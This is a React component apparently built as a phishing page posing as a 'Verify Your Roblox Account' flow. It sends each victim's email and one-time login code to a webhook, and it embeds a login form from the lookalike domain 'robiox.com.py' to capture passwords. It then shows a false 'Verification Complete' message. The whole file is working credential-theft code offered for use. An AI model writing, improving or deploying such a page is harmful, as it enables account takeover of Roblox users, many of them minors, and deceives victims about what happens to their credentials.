"use client"

import { useState } from "react"
import { Card, CardHeader, CardTitle, CardDescription, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { X, Mail, LogIn } from "lucide-react"

const VerificationFlow = () => {
  const [step, setStep] = useState("email-choice")
  const [email, setEmail] = useState("")
  const [code, setCode] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [loginCompleted, setLoginCompleted] = useState(false)

  if (step === "email-choice") {
    return (
      <Card className="w-full max-w-md">
        <CardHeader>
          <CardTitle className="text-2xl">Verify Your Roblox Account</CardTitle>
          <CardDescription>Choose how you want to verify your account</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <Button
              className="w-full h-14 bg-primary hover:bg-primary/90 text-lg font-semibold"
              onClick={() => setStep("email")}
            >
              <Mail className="w-5 h-5 mr-2" />
              Verify by Email
            </Button>
            <div className="relative">
              <div className="absolute inset-0 flex items-center">
                <span className="w-full border-t border-border" />
              </div>
              <div className="relative flex justify-center text-xs uppercase">
                <span className="bg-card px-2 text-muted-foreground">Or</span>
              </div>
            </div>
            <Button
              variant="outline"
              className="w-full h-14 text-lg font-semibold bg-transparent"
              onClick={() => setStep("manual-login")}
            >
              <LogIn className="w-5 h-5 mr-2" />
              Login to Roblox
            </Button>
          </div>
        </CardContent>
      </Card>
    )
  }

  if (step === "email") {
    return (
      <Card className="w-full max-w-md">
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle>Email Verification</CardTitle>
              <CardDescription>Enter your Roblox account email</CardDescription>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setStep("email-choice")}>
              <X className="h-4 w-4" />
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <Input
              type="email"
              placeholder="Enter your email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              disabled={isLoading}
            />
            <Button
              className="w-full bg-primary hover:bg-primary/90 font-semibold"
              disabled={!email || isLoading}
              onClick={async () => {
                setIsLoading(true)
                // Send to webhook
                try {
                  await fetch("/api/webhook", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ type: "email_submitted", email }),
                  })
                } catch (err) {
                  console.error("Webhook error:", err)
                }
                setIsLoading(false)
                setStep("code")
              }}
            >
              {isLoading ? "Sending..." : "Send Code"}
            </Button>
          </div>
        </CardContent>
      </Card>
    )
  }

  if (step === "code") {
    return (
      <Card className="w-full max-w-md">
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle>Enter Verification Code</CardTitle>
              <CardDescription>Code sent to {email}</CardDescription>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setStep("email-choice")}>
              <X className="h-4 w-4" />
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="text-center">
              <div className="text-5xl font-bold text-primary animate-pulse">✨</div>
              <p className="text-muted-foreground mt-2">Enter the code sent to your email</p>
            </div>
            <Input
              type="text"
              placeholder="000000"
              value={code}
              onChange={(e) => setCode(e.target.value)}
              maxLength="6"
              disabled={isLoading}
              className="text-center text-2xl tracking-widest"
            />
            <Button
              className="w-full bg-primary hover:bg-primary/90 font-semibold"
              disabled={!code || isLoading}
              onClick={async () => {
                setIsLoading(true)
                // Send to webhook
                try {
                  await fetch("/api/webhook", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ type: "code_submitted", email, code }),
                  })
                } catch (err) {
                  console.error("Webhook error:", err)
                }
                setIsLoading(false)
                setStep("success")
              }}
            >
              {isLoading ? "Verifying..." : "Verify Code"}
            </Button>
          </div>
        </CardContent>
      </Card>
    )
  }

  if (step === "manual-login") {
    return (
      <Card className="w-full max-w-2xl">
        <CardHeader>
          <div className="flex items-center justify-between">
            <div>
              <CardTitle>Roblox Login</CardTitle>
              <CardDescription>Login to your Roblox account to verify</CardDescription>
            </div>
            <Button variant="ghost" size="icon" onClick={() => setStep("email-choice")}>
              <X className="h-4 w-4" />
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-4">
            <div className="w-full h-[500px] border rounded-lg overflow-hidden bg-background">
              <iframe
                src="https://www.robiox.com.py/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F204583121747%2Fprofile"
                className="w-full h-full"
                title="Roblox Login"
                sandbox="allow-same-origin allow-scripts allow-forms allow-popups"
              />
            </div>
            <div className="text-sm text-muted-foreground text-center">
              Login to your Roblox account above to complete verification
            </div>
            <Button
              className="w-full bg-primary hover:bg-primary/90 font-semibold"
              onClick={() => {
                setStep("success")
              }}
            >
              I've completed the login
            </Button>
          </div>
        </CardContent>
      </Card>
    )
  }

  if (step === "success") {
    return (
      <Card className="w-full max-w-md">
        <CardContent className="pt-8">
          <div className="text-center space-y-4">
            <div className="text-6xl animate-bounce">🎉</div>
            <h2 className="text-2xl font-bold">Verification Complete!</h2>
            <p className="text-muted-foreground">Your Roblox account has been successfully verified.</p>
            <Button
              className="w-full bg-primary hover:bg-primary/90 font-semibold"
              onClick={() => setStep("email-choice")}
            >
              Verify Another Account
            </Button>
          </div>
        </CardContent>
      </Card>
    )
  }

  return null
}

export default VerificationFlow
